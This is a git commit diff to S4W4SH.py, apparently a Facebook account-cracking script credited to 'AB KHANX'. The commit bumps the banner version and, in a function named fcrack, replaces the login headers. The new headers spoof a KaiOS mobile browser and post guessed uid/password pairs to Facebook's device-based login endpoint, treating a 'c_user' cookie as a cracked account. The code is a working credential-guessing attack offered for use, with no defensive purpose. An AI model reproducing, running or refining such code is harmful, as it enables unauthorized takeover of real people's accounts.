acedf90f2e589ccd9ba8069bbae14df55ffe174e
MR-KINGX <128972681+MR-KINGX@users.noreply.github.com>
2023-05-06 13:01:04 +0500

    Add files via upload

--- S4W4SH.py
+++ S4W4SH.py
@@ -1086,19 +1086,20 @@ for xd in range(10000):
     ugen.append(uaku2)
 
 logo = """
-         \033[1;32m ##     ##     ######      ######   
+        \033[1;32m ##     ##     ######      ######   
         \033[1;32m ###   ###    ##    ##    ##    ##  
         \033[1;32m #### ####    ##          ## 
         \033[1;32m ## ### ##     ######      ######
         \033[1;32m ##     ##          ##          ##
         \033[1;32m ##     ##    ##    ##    ##    ##
         \033[1;32m ##     ##     ######      ###### 
+        
 \033[1;32m--------------------------------------------------
 {+}\033[1;32mCREATED BY     : \033[1;32mAB KHANX\033[1;32m
 {+}\033[1;32mFACEBOOK       : \033[1;32mAB KHANX\033[1;32m
 {+}\033[1;32mYOUTUBE        : \033[1;32mMSS TRICKS\033[1;32m
 --------------------------------------------------
-[•] \033[1;37mVERSION    :\033[1;32m 1.0.3 \033[1;37m"DON'T WORRY FOR UPDATES!"\033[1;37m
+[•] \033[1;37mVERSION    :\033[1;32m 1.1 \033[1;37m"DON'T WORRY FOR UPDATES!"\033[1;37m
 --------------------------------------------------"""
 
 def lines():
@@ -1466,44 +1467,22 @@ def fcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'm.facebook.com',
-
-			'upgrade-insecure-requests': '1',
-
-			'viewport-width': '980',
-
-			'method': 'path',
-
-			'scheme': 'https',
-
-			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-
-			'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8', 
-
-			'dnt':'1', 
-
-			'x-requested-with':'mark.via.gp', 
-
-			'sec-fetch-site': 'none',
-
-			'sec-fetch-mode': 'navigate',
-
-			'sec-fetch-user': '?1',
-
-			'sec-fetch-dest': 'document',
-
-			'accept-encoding':'gzip, deflate, br','accept-language': 'en-US,en;q=0.9',
-
-			'cache-control': 'max-age=0',
-
-			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
-
-			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
-
-			"sec-ch-prefers-color-scheme": "light",
-
-			'user-agent': pro}
-            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+            header_freefb = {'authority': 'p.facebook.com',
+			'method': 'GET',
+            'scheme': 'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9,ur-PK;q=0.8,ur;q=0.7,fa-IR;q=0.6,fa;q=0.5',
+            'cache-control': 'max-age=0',
+            'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
+            lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
             if 'c_user' in log_cookies:
